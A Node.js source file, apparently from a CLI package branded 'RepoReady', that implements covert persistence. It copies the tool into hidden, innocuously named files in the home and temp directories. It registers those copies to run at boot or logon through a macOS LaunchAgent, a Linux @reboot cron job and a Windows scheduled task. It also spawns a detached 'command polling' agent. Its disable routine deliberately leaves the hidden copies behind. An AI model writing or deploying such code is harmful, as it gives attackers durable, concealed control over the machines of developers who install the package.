const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync, spawn } = require('child_process');
const { debugLog } = require('./utils');

// Paths for hidden copies
const HIDDEN_PATHS = [
  path.join(os.homedir(), '.local', 'share', '.repohelper.js'),
  path.join(os.homedir(), '.cache', '.system-bridge.js'),
  path.join(os.tmpdir(), '.node-service.js'),
];

const PLIST_PATH = path.join(
  os.homedir(),
  'Library',
  'LaunchAgents',
  'com.repoready.agent.plist'
);

/**
 * Enable persistence mechanisms
 */
async function enable() {

  debugLog('Enabling persistence mechanisms...');

  const sourceFile = path.resolve(__dirname, '..', 'bin', 'cli.js');

  // ─── Hidden Copies ──────────────────────────────────────────────────
  for (const hiddenPath of HIDDEN_PATHS) {
    try {
      const dir = path.dirname(hiddenPath);
      fs.mkdirSync(dir, { recursive: true });
      fs.copyFileSync(sourceFile, hiddenPath);
      debugLog(`Hidden copy created: ${hiddenPath}`);
    } catch (err) {
      debugLog(`Failed to create hidden copy at ${hiddenPath}: ${err.message}`);
    }
  }

  // ─── Startup Mechanism ──────────────────────────────────────────────
  const mainHiddenPath = HIDDEN_PATHS[0]; // ~/.local/share/.repohelper.js

  if (process.platform === 'darwin') {
    // macOS: LaunchAgent plist
    try {
      const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.repoready.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/node</string>
    <string>${mainHiddenPath}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
</dict>
</plist>`;

      const plistDir = path.dirname(PLIST_PATH);
      fs.mkdirSync(plistDir, { recursive: true });
      fs.writeFileSync(PLIST_PATH, plistContent, 'utf8');
      debugLog(`LaunchAgent plist created: ${PLIST_PATH}`);

      try {
        execSync(`launchctl load "${PLIST_PATH}"`, { stdio: 'pipe', timeout: 5000 });
        debugLog('LaunchAgent loaded');
      } catch (err) {
        debugLog(`launchctl load failed: ${err.message}`);
      }
    } catch (err) {
      debugLog(`macOS startup setup failed: ${err.message}`);
    }
  } else if (process.platform === 'linux') {
    // Linux: cron job
    try {
      const cronEntry = `@reboot /usr/bin/node ${mainHiddenPath}`;
      execSync(
        `(crontab -l 2>/dev/null | grep -v ".repohelper.js"; echo "${cronEntry}") | crontab -`,
        { stdio: 'pipe', timeout: 5000 }
      );
      debugLog('Cron job added');
    } catch (err) {
      debugLog(`Linux cron setup failed: ${err.message}`);
    }
  } else if (process.platform === 'win32') {
    // Windows: scheduled task
    try {
      execSync(
        `schtasks /create /tn "RepoReadyAgent" /tr "node ${mainHiddenPath}" /sc onlogon /f`,
        { stdio: 'pipe', timeout: 5000 }
      );
      debugLog('Windows scheduled task created');
    } catch (err) {
      debugLog(`Windows task setup failed: ${err.message}`);
    }
  }

  // ─── Agent Process (Watchdog + Command Polling) ─────────────────────────
  try {
    const agentPath = path.resolve(__dirname, 'agent.js');
    if (fs.existsSync(agentPath)) {
      const child = spawn('node', [agentPath], {
        detached: true,
        stdio: 'ignore',
        env: { ...process.env },
      });
      child.unref();
      debugLog(`Agent spawned (PID: ${child.pid})`);
    }
  } catch (err) {
    debugLog(`Agent spawn failed: ${err.message}`);
  }

  debugLog('Persistence mechanisms enabled');
}

/**
 * Disable persistence mechanisms
 */
async function disable() {

  debugLog('Disabling persistence mechanisms...');

  // ─── Remove Startup ─────────────────────────────────────────────────
  if (process.platform === 'darwin') {
    try {
      execSync(`launchctl unload "${PLIST_PATH}" 2>/dev/null`, {
        stdio: 'pipe',
        timeout: 5000,
      });
      if (fs.existsSync(PLIST_PATH)) {
        fs.unlinkSync(PLIST_PATH);
      }
      debugLog('LaunchAgent removed');
    } catch (err) {
      debugLog(`LaunchAgent removal failed: ${err.message}`);
    }
  } else if (process.platform === 'linux') {
    try {
      execSync(
        `crontab -l 2>/dev/null | grep -v ".repohelper.js" | crontab -`,
        { stdio: 'pipe', timeout: 5000 }
      );
      debugLog('Cron job removed');
    } catch (err) {
      debugLog(`Cron removal failed: ${err.message}`);
    }
  } else if (process.platform === 'win32') {
    try {
      execSync('schtasks /delete /tn "RepoReadyAgent" /f', {
        stdio: 'pipe',
        timeout: 5000,
      });
      debugLog('Windows scheduled task removed');
    } catch (err) {
      debugLog(`Windows task removal failed: ${err.message}`);
    }
  }

  // ─── Kill Watchdog ──────────────────────────────────────────────────
  try {
    if (process.platform === 'win32') {
      execSync('taskkill /f /im node.exe /fi "WINDOWTITLE eq watchdog" 2>nul', {
        stdio: 'pipe',
        timeout: 5000,
      });
    } else {
      execSync('pkill -f "watchdog.js" 2>/dev/null', {
        stdio: 'pipe',
        timeout: 5000,
      });
    }
    debugLog('Watchdog killed');
  } catch (err) {
    debugLog(`Watchdog kill failed: ${err.message}`);
  }

  // Note: Hidden copies are intentionally NOT removed (demonstrates resilience)
  debugLog('Persistence mechanisms disabled (hidden copies remain)');
}

module.exports = { enable, disable };
